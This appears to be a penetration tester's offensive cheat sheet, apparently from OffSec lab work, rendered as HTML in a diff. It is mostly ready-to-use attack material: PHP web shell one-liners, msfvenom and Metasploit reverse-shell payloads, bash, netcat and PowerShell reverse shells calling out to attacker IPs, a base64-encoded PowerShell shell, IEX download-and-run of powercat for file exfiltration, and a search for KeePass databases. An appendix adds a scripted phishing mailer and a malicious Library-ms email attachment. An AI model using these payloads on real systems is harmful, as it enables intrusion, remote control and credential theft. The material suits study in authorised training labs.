+┌──(operator㉿labhost)-[~/OffSec]
+└─$ echo -n &quot;test&quot; | base64
+dGVzdA==
+
+┌──(operator㉿labhost)-[~/OffSec/]
+└─$ echo &quot;VXNlcm5hbWU6&quot; | base64 -d -                  
+Username:                                                                             
+┌──(operator㉿labhost)-[~/OffSec/]
+└─$ echo &quot;UGFzc3dvcmQ6&quot; | base64 -d -
+Password:   
+</code></pre>
+<h6>NodeJS</h6>
+<pre><code class="language-bash">┌──(operator㉿labhost)-[~/OffSec/]
+└─$ nodejs
+Welcome to Node.js v18.13.0.
+Type &quot;.help&quot; for more information.
+&gt; btoa(&#39;test@supermagicorg.com&#39;)
+&#39;dGVzdEBzdXBlcm1hZ2ljb3JnLmNvbQ==&#39;
+&gt; btoa(&#39;test&#39;)
+&#39;dGVzdA==&#39;
+&gt; atob(&#39;VXNlcm5hbWU6&#39;)
+&#39;Username:&#39;
+&gt; atob(&#39;UGFzc3dvcmQ6&#39;)
+&#39;Password:&#39; 
+</code></pre>
+<hr>
+<h4>Email Server CLI Interactions</h4>
+<h5>Telnet</h5>
+<h6>Send Mail</h6>
+<ul>
+<li><code>telnet 192.168.206.199 587</code></li>
+<li>SMTPD submission port connection.</li>
+<li><code>EHLO smtp.supermagicorg.com</code><ul>
+<li>Initiate interaction, server replies;<ul>
+<li><code>250-ADMIN</code></li>
+<li><code>250-SIZE 20480000</code></li>
+<li><code>250-AUTH LOGIN</code></li>
+<li><code>250 HELP</code></li>
+</ul>
+</li>
+</ul>
+</li>
+<li><code>AUTH LOGIN</code><ul>
+<li>Initiate login, server replies;<ul>
+<li><code>334 VXNlcm5hbWU6</code></li>
+<li>Base64: <code>Username:</code></li>
+</ul>
+</li>
+</ul>
+</li>
+<li><code>dGVzdEBzdXBlcm1hZ2ljb3JnLmNvbQ==</code><ul>
+<li>Send base64 enc email address, server replies;<ul>
+<li><code>334 UGFzc3dvcmQ6</code></li>
+<li>Base64: <code>Password:</code></li>
+</ul>
+</li>
+</ul>
+</li>
+<li><code>dGVzdA==</code><ul>
+<li>Send base64 enc password, server replies;<ul>
+<li><code>235 authenticated.</code></li>
+</ul>
+</li>
+</ul>
+</li>
+<li><code>MAIL FROM: test@supermagicorg.com</code><ul>
+<li>Set sender, server replies;<ul>
+<li><code>250 OK</code></li>
+</ul>
+</li>
+</ul>
+</li>
+<li><code>RCPT TO: dave.wizard@supermagicorg.com</code><ul>
+<li>Set recipient, server replies;<ul>
+<li><code>250 OK</code></li>
+</ul>
+</li>
+</ul>
+</li>
+<li><code>DATA</code><ul>
+<li>Message data, server replies;<ul>
+<li><code>354 OK, send.</code></li>
+</ul>
+</li>
+</ul>
+</li>
+<li><code>Subject: test</code></li>
+<li>Set subject.<ul>
+<li>(Press Enter Again)</li>
+</ul>
+</li>
+<li><code>Test test.</code></li>
+<li>Message body.</li>
+<li><code>.</code></li>
+<li>Send message.</li>
+<li><code>QUIT</code><ul>
+<li>Close connection, sever replies;<ul>
+<li><code>221 goodbye</code></li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<p><em>See Appendix A.1 for Bash script example</em></p>
+<h6>Read Mail</h6>
+<pre><code class="language-bash">┌──(operator㉿labhost)-[~/OffSec]
+└─$ telnet 192.168.206.199 110
+Trying 192.168.206.199...
+Connected to 192.168.206.199.
+Escape character is &#39;^]&#39;.
++OK POP3
+user test@supermagicorg.com
++OK Send your password
+pass test
++OK Mailbox locked and ready
+list
++OK 1 messages (1725 octets)
+1 1725
+.
+retr 1
+</code></pre>
+<hr>
+<h4>Web Shells</h4>
+<h5>PHP</h5>
+<h6>One-liners</h6>
+<pre><code>&lt;?php system($_GET[&#39;cmd&#39;]); ?&gt;
+
+&lt;?php echo passthru($_GET[&#39;cmd&#39;]); ?&gt;
+
+&lt;?php echo exec($_POST[&#39;cmd&#39;]); ?&gt;
+
+&lt;?php passthru($_REQUEST[&#39;cmd&#39;]); ?&gt;
+</code></pre>
+<hr>
+<h4>General Purpose Reverse Shell Listeners</h4>
+<h5>Linux</h5>
+<h6>Netcat</h6>
+<pre><code class="language-bash">nc -nvlp 4444
+</code></pre>
+<h5>Metasploit Console Reverse TCP Listener One-Liner</h5>
+<pre><code>msfconsole -x &quot;use exploit/multi/handler;set payload windows/meterpreter/reverse_tcp;set LHOST 192.168.45.195;set LPORT 443;run;&quot;
+</code></pre>
+<hr>
+<h4>Useful Reverse Shell Payloads</h4>
+<h5>MsfVenom</h5>
+<p>List payloads.</p>
+<pre><code>msfvenom -l payloads --platform windows --arch x64
+`
+</code></pre>
+<p>List payload options.</p>
+<pre><code>msfvenom --platform windows --arch x64 -p windows/x64/meterpreter_reverse_https --list-options
+</code></pre>
+<p>Win x64 single stage reverse TCP.</p>
+<pre><code>msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.182 LPORT=443 -f exe -o nonstaged.exe
+</code></pre>
+<p>Win x64 staged reverse TCP.</p>
+<pre><code>msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.168.45.182 LPORT=443 -f exe -o staged.exe
+</code></pre>
+<p>PHP reverse shell.</p>
+<pre><code>msfvenom -p php/reverse_php LHOST=192.168.45.182 LPORT=443 --platform php -o webrevshell.php
+`
+</code></pre>
+<p>Win x64 reverse HTTPS.</p>
+<pre><code>msfvenom -p windows/x64/meterpreter_reverse_https LHOST=192.168.45.182 LPORT=443 -f exe -o met.exe
+`
+</code></pre>
+<p><em>HTTPS Basic Options</em></p>
+<pre><code>Name        Current Setting  Required  Description
+----        ---------------  --------  -----------
+EXITFUNC    process          yes       Exit technique (Accepted: &#39;&#39;, seh, thread, process
+                                       , none)
+EXTENSIONS                   no        Comma-separate list of extensions to load
+EXTINIT                      no        Initialization strings for extensions
+LHOST                        yes       The local listener hostname
+LPORT       8443             yes       The local listener port
+LURI                         no        The HTTP Path
+</code></pre>
+<h6>multi/handler</h6>
+<p>From msfconsole.</p>
+<pre><code>msf6 &gt; use multi/handler
+[*] Using configured payload generic/shell_reverse_tcp
+msf6 exploit(multi/handler) &gt; set payload windows/x64/shell/reverse_tcp
+payload =&gt; windows/x64/shell/reverse_tcp
+msf6 exploit(multi/handler) &gt; show options
+</code></pre>
+<p>From local shell.</p>
+<pre><code>msfconsole -x &quot;use exploit/multi/handler;set payload windows/x64/shell_reverse_tcp;set LHOST 192.168.45.240;set LPORT 443;run;&quot;
+</code></pre>
+<h6>Migrate</h6>
+<p>Create hidden notepad process and migrate into it.</p>
+<pre><code>meterpreter &gt; execute -H -f notepad
+Process 5256 created.
+meterpreter &gt; migrate 5256
+[*] Migrating from 2500 to 5256...
+[*] Migration completed successfully.
+</code></pre>
+<h5>Linux</h5>
+<h6>URL Encode with CURL</h6>
+<pre><code class="language-bash">curl \
+    --data-urlencode &quot;paramName=value&quot; \
+    --data-urlencode &quot;secondParam=value&quot; \
+    http://example.com
+</code></pre>
+<h6>Bash</h6>
+<pre><code>&#39;/usr/bin/bash -c &quot;bash -i &gt;&amp; /dev/tcp/192.168.45.223/4444 0&gt;&amp;1&quot;&#39;
+</code></pre>
+<h6>Netcat</h6>
+<pre><code>&#39;nc 192.168.45.223 4444 -e /usr/bin/bash&#39;
+</code></pre>
+<h5>Win</h5>
+<h6>Powershell base64 encoded one-liner</h6>
+<pre><code>--- PS On Attacker ---
+
+┌──(operator㉿labhost)-[/home/operator/OffSec/sqli]
+└─PS&gt; $Text = &#39;$client = New-Object System.Net.Sockets.TCPClient(&quot;192.168.45.223&quot;,4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2&gt;&amp;1 | Out-String );$sendback2 = $sendback + &quot;PS &quot; + (pwd).Path + &quot;&gt; &quot;;$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()&#39;
+
+┌──(operator㉿labhost)-[/home/operator/OffSec/sqli]
+└─PS&gt; $Bytes = [System.Text.Encoding]::Unicode.GetBytes($Text)
+
+┌──(operator㉿labhost)-[/home/operator/OffSec/sqli]
+└─PS&gt; $EncodedText =[Convert]::ToBase64String($Bytes)
+
+┌──(operator㉿labhost)-[/home/operator/OffSec/sqli]
+└─PS&gt; $EncodedText
+JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADQANQAuADIAMgAzACIALAA0ADQANAA0ACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA==
+
+--- PS END ---
+
+
+# To exec on target (Great for web-shell upgrades or SQLi os commands)
+
+powershell -enc JABjAGwAaQBlAG4A...
+</code></pre>
+<h4>Useful Commands Once Shelled</h4>
+<h5>Linux</h5>
+<h6>Seach files from shell</h6>
+<pre><code>find /path/to/search -name &#39;file.txt&#39;
+</code></pre>
+<h6>Recieve file transfer via Ncat listener <em>(Windows A.1)</em></h6>
+<pre><code class="language-bash">┌──(operator㉿labhost)-[~/OffSec/client-side]
+└─$ nc -nvlp 4444 &gt; outfile.txt
+</code></pre>
+<h6>Transfer a file, receiver listens <em>(Windows A.1)</em></h6>
+<pre><code>host2$ ncat -l &gt; outputfile
+host1$ ncat --send-only host2 &lt; inputfile
+</code></pre>
+<h6>Send a File Transfer</h6>
+<pre><code class="language-bash">┌──(operator㉿labhost)-[~/OffSec/client-side]
+└─$ ncat 192.168.212.196 4445 &lt; mymacro.doc
+</code></pre>
+<h6>Transfer a file, sender listens</h6>
+<pre><code>host1$ ncat -l --send-only &lt; inputfile
+host2$ ncat host1 &gt; outputfile
+</code></pre>
+<h5>Windows</h5>
+<h6>Powershell File Search</h6>
+<pre><code>Windows PowerShell
+Copyright (C) Microsoft Corporation. All rights reserved.
+
+Install the latest PowerShell for new features and improvements! https://aka.ms/PSWindows
+
+PS C:\Users\jason&gt; Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue
+
+
+    Directory: C:\Users\jason\Documents
+
+
+Mode                 LastWriteTime         Length Name
+----                 -------------         ------ ----
+-a----         5/30/2022  10:33 AM           1982 Database.kdbx
+</code></pre>
+<ul>
+<li>User PowerShell.<ul>
+<li><a href="https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.management/get-childitem">Get-ChildItem</a></li>
+</ul>
+</li>
+<li>Search the whole drive with <code>-Path C:\</code></li>
+<li>Specify file type with <code>-Include</code></li>
+<li>Get a list of files and sub dirs with <code>-File</code> and <code>-Recurse</code><ul>
+<li>Silence errors and cont exec with <code>-ErrorAction</code> set to <code>SilentlyContinue</code></li>
+</ul>
+</li>
+</ul>
+<h6>MD5 Sum in PowerShell</h6>
+<pre><code class="language-powershell">PS C:\Users\offsec&gt; Get-FileHash .\Desktop\file.txt -Algorithm MD5
+</code></pre>
+<h6>Network file transfer to Ncat listener with powercat.ps1 loaded via network <em>(Linux A.1)</em></h6>
+<pre><code class="language-powershell">PS C:\Users\offsec&gt; IEX(New-Object System.Net.WebClient).DownloadString(&#39;http://192.168.45.223/powercat.ps1&#39;);powercat -c 192.168.45.223 -p 4444 -i .\Desktop\infile.txt -v
+
+PS C:\Users\offsec&gt; IEX(New-Object System.Net.WebClient).DownloadString(&#39;http://192.168.45.223/powercat.ps1&#39;);powercat -l -p 4444 -of C:\file.txt -v
+</code></pre>
+<hr>
+<h4>Delivery Mechanisms</h4>
+<h5>Linux</h5>
+<h6>WebDAV</h6>
+<p>Install <code>wsgidav</code> from <code>apt</code> or <code>pip</code></p>
+<pre><code class="language-bash">┌──(operator㉿labhost)-[~/OffSec/]
+└─$ wsgidav -H 0.0.0.0 -p 80 --auth anonymous -r ~/webdav
+</code></pre>
+<h6>HTTP</h6>
+<pre><code class="language-bash">┌──(operator㉿labhost)-[~/]
+└─$ python -m http.server -d path/to/serve 8080 
+Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...
+</code></pre>
+<hr>
+<h4>Appendix</h4>
+<h5>Appendix A.1</h5>
+<h6>CLI Telnet SMTP Mail Client with Attachment</h6>
+<pre><code>#!/bin/bash
+
+# User input to compose email
+read -p &quot;[*] Enter target mail server URL or IP: &quot; SERVER
+read -p &quot;[*] Enter submission port #: &quot; PORT
+read -p &quot;[*] Enter sender mail server URL: &quot; ORIGIN
+read -p &quot;[*] Enter email address for auth: &quot; SENDER
+read -p &quot;[*] Enter password for auth: &quot; PASSWD
+read -p &quot;[*] Enter recipient email address: &quot; RECIPIENT
+read -p &quot;[*] Enter message subject: &quot; SUBJECT
+read -p &quot;[*] Enter message body: &quot; BODY
+read -p &quot;[*] Path to attachment (Enter if none)?: &quot; FILE
+
+# Base64 encode username, password, and file attachment (if any)
+ENCU=$(printf &quot;$SENDER&quot; | base64);
+ENCP=$(printf &quot;$PASSWD&quot; | base64);
+
+# Check vars
+sleep 0.5;
+echo &quot;[$] Preparing email...&quot;
+echo &quot;[+] Target mail server: $SERVER&quot;
+echo &quot;[+] Port: $PORT&quot;
+echo &quot;[+] Sending mail server: $ORIGIN&quot;
+echo &quot;[+] Sender: $SENDER&quot;
+echo &quot;[+] Passwd: $PASSWD&quot;
+echo &quot;[+] Base64 Username: $ENCU&quot;
+echo &quot;[+] Base64 Password: $ENCP&quot;
+echo &quot;[+] Recipient: $RECIPIENT&quot;
+echo &quot;[+] Subject: $SUBJECT&quot;
+echo &quot;[+] Body: $BODY&quot;
+if [ ! -z &quot;$FILE&quot; ]
+then
+    echo &quot;[+] File attachment: $FILE&quot;
+    echo &quot;[+] Base64 file string: $ENCF&quot;
+fi
+
+# Telnet session
+{
+sleep 2;
+echo &quot;EHLO $ORIGIN&quot;
+sleep 2;
+echo &quot;AUTH LOGIN&quot;
+sleep 2;
+echo &quot;$ENCU&quot;
+sleep 2;
+echo &quot;$ENCP&quot;
+sleep 2;
+echo &quot;MAIL FROM: $SENDER&quot;
+sleep 2;
+echo &quot;RCPT TO: $RECIPIENT&quot;
+sleep 2;
+echo &quot;DATA&quot;
+sleep 2;
+echo &quot;Subject: $SUBJECT&quot;
+sleep 2;
+if [ ! -z &quot;$FILE&quot; ]
+then
+    echo &quot;Content-Type: multipart/mixed; boundary=&quot;x-=-segment sep&quot;&quot;
+    sleep 2;
+    echo &quot;&quot;
+    sleep 2;
+    echo &quot;This is a MIME formatted message.  If you see this text it means that your&quot;
+    sleep 2;
+    echo &quot;email software does not support MIME formatted messages.&quot;
+    sleep 2;
+    echo &quot;--x-=-segment sep&quot;
+    sleep 2;
+    echo &quot;Content-Type: text/plain; charset=UTF-8; format=flowed&quot;
+    sleep 2;
+    echo &quot;Content-Disposition: inline&quot;
+    sleep 2;
+fi
+echo &quot;&quot;
+sleep 2;
+echo $BODY
+sleep 2;
+echo &quot;&quot;
+sleep 2;
+if [ ! -z &quot;$FILE&quot; ]
+then
+    echo &quot;--x-=-segment sep&quot;
+    sleep 2;
+    echo &quot;Content-Type: file --mime-type -b $FILE; name=$FILE&quot;
+    sleep 2;
+    echo &quot;Content-Transfer-Encoding: base64&quot;
+    sleep 2;
+    echo &quot;Content-Disposition: attachment; filename=&quot;$FILE&quot;;&quot;
+    sleep 2;
+    echo &quot;&quot;
+    sleep 2;
+    for SEG in $(base64 $FILE)
+    do
+        echo &quot;$SEG&quot;
+    done
+    sleep 2;
+    echo &quot;&quot;
+    sleep 2;
+    echo &quot;--x-=-segment sep--&quot;
+    sleep 2;
+fi
+echo &quot;.&quot;
+sleep 2;
+echo &quot;QUIT&quot;
+sleep 4;
+} | telnet $SERVER $PORT
+
+echo &quot;[-] Exit with status: $?&quot;
+</code></pre>
+<h6>Example of Library-ms sent via Win Mail Client</h6>
+<pre><code>Return-Path: test@supermagicorg.com
+Received: from smtp.supermagicorg.com (Unknown [192.168.45.223])
+    by ADMIN with ESMTPA
+    ; Sat, 9 Sep 2023 15:08:54 -0700
+Message-ID: &lt;61727A3C-5FAC-4DDC-8590-7199969083FC@ADMIN&gt;
+
+Subject: Test email
+
+Content-Type: multipart/mixed; boundary=----------5bXWLJjHEcPk2U7KNqSl
+
+This is a MIME formatted message.  If you see this text it means that your
+email software does not support MIME formatted messages.
+
+----------5bXWLJjHEcPk2U7KNqSl
+Content-Type: text/plain; charset=UTF-8; format=flowed
+Content-Disposition: inline
+
+test 1, 2, 3
+
+
+----------5bXWLJjHEcPk2U7KNqSl
+Content-Type: file --mime-type -b config.Library-ms; name=config.Library-ms
+Content-Transfer-Encoding: base64
+Content-Disposition: attachment; filename=config.Library-ms;
+
+PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0iVVRGLTgiPz4NCjxsaWJyYXJ5RGVzY3JpcHRp b24geG1sbnM9Imh0dHA6Ly9zY2hlbWFzLm1pY3Jvc29mdC5jb20vd2luZG93cy8yMDA5L2xpYnJh cnkiPg0KPG5hbWU+QHdpbmRvd3Muc3RvcmFnZS5kbGwsLTM0NTgyPC9uYW1lPg0KPHZlcnNpb24+ NjwvdmVyc2lvbj4NCjxpc0xpYnJhcnlQaW5uZWQ+dHJ1ZTwvaXNMaWJyYXJ5UGlubmVkPg0KPGlj b25SZWZlcmVuY2U+aW1hZ2VyZXMuZGxsLC0xMDAzPC9pY29uUmVmZXJlbmNlPg0KPHRlbXBsYXRl SW5mbz4NCjxmb2xkZXJUeXBlPns3ZDQ5ZDcyNi0zYzIxLTRmMDUtOTlhYS1mZGMyYzk0NzQ2NTZ9 PC9mb2xkZXJUeXBlPg0KPC90ZW1wbGF0ZUluZm8+DQo8c2VhcmNoQ29ubmVjdG9yRGVzY3JpcHRp b25MaXN0Pg0KPHNlYXJjaENvbm5lY3RvckRlc2NyaXB0aW9uPg0KPGlzRGVmYXVsdFNhdmVMb2Nh dGlvbj50cnVlPC9pc0RlZmF1bHRTYXZlTG9jYXRpb24+DQo8aXNTdXBwb3J0ZWQ+ZmFsc2U8L2lz U3VwcG9ydGVkPg0KPHNpbXBsZUxvY2F0aW9uPg0KPHVybD5odHRwOi8vMTkyLjE2OC40NS4yMjM8 L3VybD4NCjwvc2ltcGxlTG9jYXRpb24+DQo8L3NlYXJjaENvbm5lY3RvckRlc2NyaXB0aW9uPg0K PC9zZWFyY2hDb25uZWN0b3JEZXNjcmlwdGlvbkxpc3Q+DQo8L2xpYnJhcnlEZXNjcmlwdGlvbj4=
+
+
+----------5bXWLJjHEcPk2U7KNqSl
+
+.
+</code></pre>
+
+      </div>
+    </article>
+  
